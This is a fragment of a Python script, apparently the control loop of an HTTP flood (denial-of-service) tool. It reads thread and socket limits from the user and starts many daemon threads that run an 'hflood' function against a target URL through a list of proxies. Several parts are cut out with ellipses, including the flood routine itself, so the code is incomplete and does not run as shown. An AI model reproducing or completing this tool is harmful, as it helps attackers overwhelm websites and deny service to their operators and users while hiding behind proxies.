...
if pro:
    while True:
        try:
            ...
            print("Invalid max_threads value. Must be an integer")
            pass
    while True:
        try:
            min_sockets = int(input("Min Sockets: "))
            break
        except KeyboardInterrupt:
            sys.exit()
        except ValueError:
            print("Invalid min_sockets value. Must be an integer")
            pass
else:
    max_threads = 100
    min_sockets = 30
...
if pro:
    while True:
        try:
            ...
            print(f"Invalid value. Must be an integer")
            pass
        ...
        for proxy in proxies:
            ...
            while True:
                if active_threads >= max_threads:
                    continue
                threading.Thread(target=hflood, args=[url], kwargs={"proxy": proxy, "timeout": timeout, "delay": delay}, daemon=True).start()
                break
except KeyboardInterrupt:
    sys.exit()
except Exception as e:
